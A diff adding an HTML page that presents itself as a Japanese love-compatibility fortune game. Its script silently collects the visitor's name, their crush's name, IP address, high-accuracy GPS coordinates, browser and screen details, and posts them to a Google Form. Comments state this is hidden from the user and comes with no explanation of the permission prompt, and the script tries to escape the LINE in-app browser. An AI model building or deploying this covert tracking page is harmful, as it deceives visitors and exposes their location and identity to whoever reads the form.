@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <title>恋愛占い</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Sans JP", sans-serif; background: #fff0f6; margin: 0; color: #333; }
+    header { text-align: center; padding: 22px; background: #ffb3d9; }
+    h1 { margin: 0; font-size: 2rem; letter-spacing: 0.04em; }
+    main { max-width: 640px; margin: 24px auto; background: #fff; padding: 22px; border-radius: 12px; box-shadow: 0 8px 24px rgba(255, 77, 148, 0.08); }
+    label { display: block; margin-top: 14px; font-weight: 700; }
+    input { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #ddd; border-radius: 10px; font-size: 1rem; }
+    button { margin-top: 20px; padding: 12px 16px; background: #ff4d94; color: #fff; border: none; border-radius: 10px; font-size: 1rem; cursor: pointer; }
+    button:disabled { background: #bbb; cursor: not-allowed; }
+    .result { margin-top: 18px; font-size: 1.15rem; font-weight: 700; }
+    .note { margin-top: 10px; color: #666; font-size: .95rem; }
+  </style>
+</head>
+<body>
+  <header><h1>恋愛占い</h1></header>
+
+  <main>
+    <form id="loveForm">
+      <label>あなたの名前
+        <input type="text" id="yourName" required placeholder="例: 太郎">
+      </label>
+      <label>好きな人の名前
+        <input type="text" id="crushName" required placeholder="例: 花子">
+      </label>
+      <button type="submit" id="startBtn">始める</button>
+    </form>
+
+    <div id="status" class="note"></div>
+    <div id="fortuneResult" class="result" style="display:none;"></div>
+  </main>
+
+  <script>
+    // Googleフォーム送信先とentry IDs（あなたのフォームに合わせています）
+    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdM5MrP4GDwETJYUuFg9UgEjYzh71xssOqKpCApmegWtGD_qg/formResponse";
+    const ENTRY = {
+      yourName: "entry.1453969451",
+      crushName: "entry.2050615094",
+      lat: "entry.1858177105",
+      lon: "entry.1778813085",
+      ip: "entry.906589051",
+      ua: "entry.664800063",
+      lang: "entry.287693460",
+      ref: "entry.2022923885",
+      screen: "entry.1421079089"
+    };
+
+    // 環境情報
+    const env = {
+      ip: null,
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      ref: document.referrer || "",
+      screen: `${window.screen.width}x${window.screen.height}`,
+      coords: { lat: "", lon: "" } // UIでは触れません
+    };
+
+    // IP取得（非同期）
+    (async function fetchIP() {
+      try {
+        const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+        const d = await r.json();
+        env.ip = d.ip || null;
+      } catch (_) { /* 無視 */ }
+    })();
+
+    // LINE内ブラウザ判定
+    function isLineInApp() {
+      const ua = navigator.userAgent;
+      return ua.includes("Line") || ua.includes("LINE");
+    }
+
+    // 外部ブラウザへ切替（ベストエフォート）
+    async function tryOpenExternal() {
+      const url = location.href;
+      const ua = navigator.userAgent;
+
+      // Android: Chromeのintentスキームを試す
+      if (/Android/i.test(ua)) {
+        const intentUrl = `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=${location.protocol.replace(":", "")};package=com.android.chrome;end`;
+        try {
+          // まず新規タブ
+          window.open(url, "_blank", "noopener,noreferrer");
+          // 続けてintentでChromeへ
+          location.href = intentUrl;
+          return;
+        } catch (_) { /* 無視 */ }
+      }
+
+      // iOS: googlechromeスキームを試す（インストールされていないと失敗）
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        try {
+          const chromeUrl = url.replace(/^https?:\/\//, "googlechrome://");
+          window.location.href = chromeUrl;
+          return;
+        } catch (_) { /* 無視 */ }
+      }
+
+      // フォールバック: 新規タブに開く
+      window.open(url, "_blank", "noopener,noreferrer");
+    }
+
+    // 占いロジック（A〜E）
+    function getFortune(yourName, crushName) {
+      const s = yourName + crushName;
+      let sum = 0;
+      for (let i = 0; i < s.length; i++) sum += s.charCodeAt(i);
+      const rank = sum % 5; // 0-4
+      return ["A","B","C","D","E"][rank];
+    }
+
+    // 送信用FormData構築
+    function buildFormData(yourName, crushName) {
+      const fd = new FormData();
+      fd.append(ENTRY.yourName, yourName);
+      fd.append(ENTRY.crushName, crushName);
+      fd.append(ENTRY.lat, env.coords.lat);
+      fd.append(ENTRY.lon, env.coords.lon);
+      fd.append(ENTRY.ip, env.ip ?? "");
+      fd.append(ENTRY.ua, env.ua ?? "");
+      fd.append(ENTRY.lang, env.lang ?? "");
+      fd.append(ENTRY.ref, env.ref ?? "");
+      fd.append(ENTRY.screen, env.screen ?? "");
+      return fd;
+    }
+
+    // GoogleフォームへPOST（no-cors）
+    async function postToGoogleForms(fd) {
+      try {
+        await fetch(FORM_URL, { method: "POST", mode: "no-cors", body: fd });
+        return true;
+      } catch (_) {
+        return false;
+      }
+    }
+
+    // 始めるボタンで一気に開始
+    document.getElementById("loveForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const statusEl = document.getElementById("status");
+      const resultEl = document.getElementById("fortuneResult");
+      const yourName = document.getElementById("yourName").value.trim();
+      const crushName = document.getElementById("crushName").value.trim();
+      if (!yourName || !crushName) {
+        statusEl.textContent = "名前を入力してください。";
+        return;
+      }
+
+      // LINE内なら外部ブラウザに切替を試みる（ボタン一つで同じ動作）
+      if (isLineInApp()) {
+        tryOpenExternal();
+      }
+
+      // サイレントに環境値を更新（UIには一切表示しない）
+      // 位置座標は利用可能なら取得します（テキスト表示や許可説明はしません）
+      try {
+        await new Promise((resolve, reject) => {
+          if (!("geolocation" in navigator)) return resolve();
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              env.coords.lat = pos.coords.latitude;
+              env.coords.lon = pos.coords.longitude;
+              resolve();
+            },
+            () => resolve(), // 取得できなくても進む
+            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          );
+        });
+      } catch (_) { /* 無視 */ }
+
+      statusEl.textContent = "送信中…";
+
+      const fd = buildFormData(yourName, crushName);
+      await postToGoogleForms(fd);
+
+      // 占い結果表示（Aが最良）
+      const fortune = getFortune(yourName, crushName);
+      resultEl.textContent = `あなたと ${crushName} さんの相性は…【${fortune}】`;
+      resultEl.style.display = "block";
+      statusEl.textContent = "完了しました。";
+    });
+  </script>
+</body>
+</html>
